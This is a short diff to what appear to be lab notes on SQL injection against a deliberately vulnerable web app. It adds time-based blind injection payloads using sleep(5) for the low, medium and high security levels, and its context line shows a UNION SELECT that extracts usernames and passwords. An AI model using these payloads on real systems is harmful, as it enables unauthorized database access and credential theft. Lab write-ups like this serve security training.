@@ -635,10 +635,21 @@ Payload: `' UNION SELECT user, password FROM users#`
 
 
 **Security level is currently: low.**
+
+Payload to detect vulnerability: `1' and sleep(5)#` it is taking 5 to response.
+
+
+
+
 **Security level is currently: medium.**
+
+Payload to detect vulnerability: `1 and sleep(5)` it is taking 5 to response.
+
+
+
 **Security level is currently: high.**
 
-
+Payload to detect vulnerability: `1' and sleep(5)#` it is taking 5 to response.
 
 
 ---
